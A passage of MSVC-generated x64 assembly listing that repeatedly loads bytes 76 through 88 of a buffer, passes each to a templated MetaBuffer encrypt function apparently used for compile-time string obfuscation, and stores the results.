	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c97	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00c9c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ca3	88 41 4c	 mov	 BYTE PTR [rcx+76], al
  00ca6	b8 01 00 00 00	 mov	 eax, 1
  00cab	48 6b c0 4c	 imul	 rax, rax, 76		; 0000004cH
  00caf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00cb6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00cba	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00cc1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00cc6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ccd	88 41 4d	 mov	 BYTE PTR [rcx+77], al
  00cd0	b8 01 00 00 00	 mov	 eax, 1
  00cd5	48 6b c0 4d	 imul	 rax, rax, 77		; 0000004dH
  00cd9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ce0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ce4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ceb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00cf0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00cf7	88 41 4e	 mov	 BYTE PTR [rcx+78], al
  00cfa	b8 01 00 00 00	 mov	 eax, 1
  00cff	48 6b c0 4e	 imul	 rax, rax, 78		; 0000004eH
  00d03	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00d0a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00d0e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d15	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00d1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d21	88 41 4f	 mov	 BYTE PTR [rcx+79], al
  00d24	b8 01 00 00 00	 mov	 eax, 1
  00d29	48 6b c0 4f	 imul	 rax, rax, 79		; 0000004fH
  00d2d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00d34	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00d38	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d3f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00d44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d4b	88 41 50	 mov	 BYTE PTR [rcx+80], al
  00d4e	b8 01 00 00 00	 mov	 eax, 1
  00d53	48 6b c0 50	 imul	 rax, rax, 80		; 00000050H
  00d57	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00d5e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00d62	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d69	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00d6e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d75	88 41 51	 mov	 BYTE PTR [rcx+81], al
  00d78	b8 01 00 00 00	 mov	 eax, 1
  00d7d	48 6b c0 51	 imul	 rax, rax, 81		; 00000051H
  00d81	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00d88	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00d8c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d93	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00d98	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d9f	88 41 52	 mov	 BYTE PTR [rcx+82], al
  00da2	b8 01 00 00 00	 mov	 eax, 1
  00da7	48 6b c0 52	 imul	 rax, rax, 82		; 00000052H
  00dab	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00db2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00db6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00dbd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00dc2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00dc9	88 41 53	 mov	 BYTE PTR [rcx+83], al
  00dcc	b8 01 00 00 00	 mov	 eax, 1
  00dd1	48 6b c0 53	 imul	 rax, rax, 83		; 00000053H
  00dd5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ddc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00de0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00de7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00dec	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00df3	88 41 54	 mov	 BYTE PTR [rcx+84], al
  00df6	b8 01 00 00 00	 mov	 eax, 1
  00dfb	48 6b c0 54	 imul	 rax, rax, 84		; 00000054H
  00dff	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00e06	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00e0a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00e11	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00e16	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00e1d	88 41 55	 mov	 BYTE PTR [rcx+85], al
  00e20	b8 01 00 00 00	 mov	 eax, 1
  00e25	48 6b c0 55	 imul	 rax, rax, 85		; 00000055H
  00e29	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00e30	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00e34	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00e3b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00e40	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00e47	88 41 56	 mov	 BYTE PTR [rcx+86], al
  00e4a	b8 01 00 00 00	 mov	 eax, 1
  00e4f	48 6b c0 56	 imul	 rax, rax, 86		; 00000056H
  00e53	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00e5a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00e5e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00e65	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00e6a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00e71	88 41 57	 mov	 BYTE PTR [rcx+87], al
  00e74	b8 01 00 00 00	 mov	 eax, 1
  00e79	48 6b c0 57	 imul	 rax, rax, 87		; 00000057H
  00e7d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00e84	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00e88	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00e8f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00e94	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00e9b	88 41 58	 mov	 BYTE PTR [rcx+88], al
  00e9e	b8 01 00 00 00	 mov	 eax, 1
  00ea3	48 6b c0 58	 imul	 rax, rax, 88		; 00000058H
  00ea7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
